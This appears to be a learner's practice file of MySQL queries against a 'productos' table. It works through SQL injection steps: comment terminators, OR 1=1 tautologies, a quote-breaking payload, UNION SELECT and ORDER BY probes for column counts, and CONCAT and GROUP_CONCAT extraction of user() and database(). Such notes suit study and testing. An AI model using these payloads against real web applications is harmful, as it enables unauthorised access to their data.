SELECT * FROM productos WHERE idprod='9' -- algun comentario pepito
SELECT * FROM productos WHERE idprod='9' #otro comentario

SELECT * FROM productos WHERE idprod='9' /*comentario multiplelinea
dhfdjkdfhfkjgh
otra linea
otra linea*/

SELECT * FROM productos WHERE idprod='9' OR 1=1

SELECT * FROM productos WHERE idprod='9s'
SELECT * FROM productos WHERE idprod='10juancarlos'

SELECT * FROM productos WHERE idprod=10' or 1=1--+'

SELECT 1,2,3,4 UNION SELECT 5,6,7,8

SELECT 1,2,3,4 UNION SELECT 5,6,7

SELECT * FROM productos WHERE idprod=9
UNION SELECT 1, 2, 3, 4, 5

SELECT * FROM productos ORDER BY 'nombre';
SELECT * FROM productos ORDER BY fabricante;
SELECT * FROM productos ORDER BY 8;

SELECT 1,2,3,4, CONCAT (1,2)

SELECT 1,2,3,4, CONCAT ('Juan', 'Perez')

SELECT CONCAT(nombre, fabricante) FROM productos

SELECT CONCAT(nombre,'-', fabricante) FROM productos

SELECT GROUP_CONCAT(nombre) FROM productos;

SELECT CONCAT_WS('(%)',user(), database())



